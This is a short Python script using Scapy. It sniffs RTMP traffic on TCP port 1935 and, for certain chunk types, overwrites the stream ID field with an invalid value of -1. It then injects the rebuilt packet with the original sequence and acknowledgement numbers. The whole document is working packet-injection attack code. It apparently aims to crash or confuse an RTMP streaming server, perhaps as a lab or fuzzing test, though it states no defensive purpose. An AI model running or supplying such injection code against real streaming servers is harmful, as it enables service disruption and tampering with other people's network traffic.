from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
import binascii

def modify_packet(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt[TCP].dport == 1935:
        payload = bytearray(bytes(pkt[Raw].load))
        if len(payload) > 14:
            chunk_type = payload[0] & 0xC0
            if chunk_type in (0x00, 0x40):  # RTMP chunk type 0 or 1
                # Modify Stream ID (offset 11-14)
                payload[11:15] = b"\xFF\xFF\xFF\xFF"  # Stream ID = -1
                # Rebuild packet, preserve seq/ack, set flags to 'PA'
                new_pkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / \
                         TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, 
                             seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags="PA") / \
                         Raw(load=payload)
                # Recalculate checksums
                del new_pkt[IP].chksum
                del new_pkt[TCP].chksum
                send(new_pkt, verbose=0)
                print("¡Paquete modificado (Stream ID inválido) enviado!")

if __name__ == "__main__":
    iface = "br-380b2498e4b8"  # Default interface, change to e.g. 'eth0' if needed
    print(f"[INFO] Starting sniff on interface: {iface} (tcp port 1935)")
    sniff(filter="tcp port 1935", prn=modify_packet, iface=iface)